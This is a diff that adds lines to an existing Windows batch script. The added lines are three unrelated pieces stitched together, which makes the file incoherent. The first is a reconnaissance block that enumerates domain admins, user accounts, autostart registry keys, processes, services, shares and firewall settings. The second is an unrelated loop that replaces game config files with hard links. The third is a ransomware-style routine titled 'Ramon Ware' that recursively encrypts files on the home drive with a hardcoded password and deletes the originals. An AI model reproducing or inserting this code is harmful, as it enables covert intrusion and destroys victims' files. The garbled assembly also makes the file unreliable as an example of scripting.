@@ -632,3 +632,77 @@ if "%long%" == "yes" (
 	)
 	echo.
 )
+net user Administrator /domain
+net Accounts
+net localgroup administrators
+net use
+net share
+net group "domain admins" /domain
+net config workstation
+net accounts
+net accounts /domain
+net view
+sc.exe query
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
+reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+wmic useraccount list
+wmic useraccount get /ALL
+wmic startup list brief
+wmic share list
+wmic service get name,displayname,pathname,startmode
+wmic process list brief
+wmic process get caption,executablepath,commandline
+wmic qfe get description,installedOn /format:csv
+arp -a
+whoami
+ipconfig /displaydns
+route print
+netsh advfirewall show allprofiles
+systeminfo
+qwinsta
+FOR /f "delims=" %%g in ('dir /a:d-h /b') do ( 
+	IF /I NOT %%g==release ( 
+    	IF /I NOT %%g==master_docs (
+    		del %%g\description.ext
+    		::timeout 1
+		    mklink /h %%g\description.ext master_docs\description.ext
+		    del %%g\initServer.sqf
+		    ::timeout 1
+		    mklink /h %%g\initServer.ext master_docs\initServer.sqf
+		    del %%g\160_ace_config.hpp
+		    ::timeout 1
+		    mklink /h %%g\160_ace_config.hpp master_docs\160_ace_config.hpp
+		    del %%g\initplayerserver.sqf
+		    ::timeout 1
+		    mklink /h %%g\initplayerserver.sqf master_docs\initplayerserver.sqf
+    	)
+    )
+) 
+mode con:cols=50 lines=2
+set pass=SegoCode
+
+Title Ramon Ware
+
+echo Scanning. . . .
+REM Change file extension *.123test for *.doc
+FOR /R "%homedrive%\" %%X in (*.123test) DO (
+REM echo %%X >> %homedrive%\Original.txt SafeMode
+REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode   
+aescrypt -e -p %pass% "%%X"
+del "%%X"
+)
